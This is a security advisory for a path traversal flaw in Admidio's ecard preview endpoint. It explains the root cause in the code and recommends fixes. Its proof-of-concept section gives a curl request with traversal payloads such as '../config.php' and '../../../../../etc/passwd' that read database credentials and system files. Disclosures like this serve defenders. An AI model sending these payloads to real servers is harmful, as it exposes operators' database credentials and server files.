# [M] Admidio has Path Traversal in ECard Preview that Allows Reading Arbitrary Server Files Including Database Credentials

## Summary
Severity: Medium
Advisory: GHSA-m3vp-3jjm-gpmx
CVE: CVE-2026-41655
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-m3vp-3jjm-gpmx
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The `ecard_preview.php` endpoint does not validate that the `ecard_template` POST parameter is a safe filename before passing it to `ECard::getEcardTemplate()`. An authenticated user can supply a path traversal payload (e.g., `../config.php`) to read arbitrary files accessible to the web server process, including `adm_my_files/config.php` which contains database credentials.

## Details

**Root Cause:** The `ecard_template` parameter is a select box whose value is only sanitized via `strStripTags()` during form validation, which does not restrict path traversal characters. Unlike `ecard_send.php` which explicitly validates the template name as a safe filename, `ecard_preview.php` omits this check entirely.

**Code Path:**

1. `modules/photos/ecards.php:143-152` — The form creates a select box with template filenames from `adm_my_files/ecard_templates/`. The form object is stored in the session.

2. `modules/photos/ecard_preview.php:33-34` — The POST request is validated against the stored form object:
```php
$categoryEditForm = $gCurrentSession->getFormObject($_POST['adm_csrf_token']);
$formValues = $categoryEditForm->validate($_POST);
```

3. `src/UI/Presenter/FormPresenter.php:2190-2243` — The `validate()` method applies `StringUtils::strStripTags()` to all values and performs type-specific checks for `captcha`, `date`, `editor`, `email`, `number`, `url`, and `uuid` — but has **no validation case for select box values**. The attacker-controlled value `../config.php` passes through unchanged.

4. `modules/photos/ecard_preview.php:48` — The unvalidated value is passed directly to `getEcardTemplate()`:
```php
$ecardDataToParse = $funcClass->getEcardTemplate($formValues['ecard_template']);
```

5. `src/Photos/ValueObject/ECard.php:67-77` — The filename is concatenated into the path and opened:
```php
public function getEcardTemplate(string $tplFilename, string $tplFolder = ''): ?string
{
    if ($tplFolder === '') {
        $tplFolder = ADMIDIO_PATH . FOLDER_DATA . '/ecard_templates/';
    }
    // ...
    $fileHandle = @fopen($tplFolder . $tplFilename, 'rb');
```

With `$tplFilename = '../config.php'`, this resolves to `ADMIDIO_PATH/adm_my_files/ecard_templates/../config.php` → `ADMIDIO_PATH/adm_my_files/config.php`.

**Why `ecard_send.php` is NOT vulnerable:** At line 35, it independently validates the template name:
```php
$postTemplateName = admFuncVariableIsValid($_POST, 'ecard_template', 'file', array('requireValue' => true));
```
This calls `strIsValidFileName()` which checks `basename($filename) !== $filename`, blocking any path traversal. The preview endpoint lacks this check.

## PoC

```bash
# Step 1: Log in and visit the ecard form to create a session with a form object
# Navigate to: /modules/photos/ecards.php?photo_uuid=<valid_album_uuid>&photo_nr=1
# Extract the adm_csrf_token from the rendered form HTML

# Step 2: Send path traversal payload to read config.php (contains DB credentials)
curl -b 'PHPSESSID=<session_cookie>' \
  -X POST 'https://target/modules/photos/ecard_preview.php' \
  -d 'adm_csrf_token=<csrf_token>&ecard_template=../config.php&ecard_message=test&photo_uuid=<valid_uuid>&photo_nr=1&submit_action=preview'

# The response body will contain the contents of adm_my_files/config.php
# rendered inside the ecard preview HTML, including:
#   $g_adm_srv (database host)
#   $g_adm_db  (database name)
#   $g_adm_usr (database username)
#   $g_adm_pw  (database password)

# To traverse further outside adm_my_files:
# ecard_template=../../system/bootstrap/constants.php  (reads PHP source)
# ecard_template=../../../../../etc/passwd              (reads system files)
```

## Impact

- **Database credential disclosure:** Any authenticated user can read `adm_my_files/config.php`, exposing database host, name, username, and password. If the database is network-accessible, this enables full database compromise.
- **Source code disclosure:** Arbitrary PHP files can be read, revealing application logic, internal paths, and potentially other secrets.
- **System file disclosure:** With sufficient traversal depth (`../../../../../etc/passwd`), system files can be read, aiding further attacks.
- **Low barrier to exploit:** Only requires a regular member account — no admin privileges needed.

## Recommended Fix

Add filename validation to `ecard_preview.php` before passing the template name to `getEcardTemplate()`, matching the validation already present in `ecard_send.php`:

```php
// In modules/photos/ecard_preview.php, add BEFORE line 48:
$postTemplateName = admFuncVariableIsValid(
    $formValues, 'ecard_template', 'file', array('requireValue' => true)
);
$ecardDataToParse = $funcClass->getEcardTemplate($postTemplateName);
```

Alternatively, add select box value validation to `FormPresenter::validate()` to verify that submitted select box values match one of the predefined options, which would protect all select boxes across the application:

```php
// In src/UI/Presenter/FormPresenter.php, inside the switch statement in validate():
case 'select':
    if (isset($element['values']) && !array_key_exists($fieldValues[$element['id']], $element['values'])) {
        throw new Exception('SYS_FIELD_INVALID_INPUT', array($element['label']));
    }
    break;
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-m3vp-3jjm-gpmx
- https://nvd.nist.gov/vuln/detail/CVE-2026-41655
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
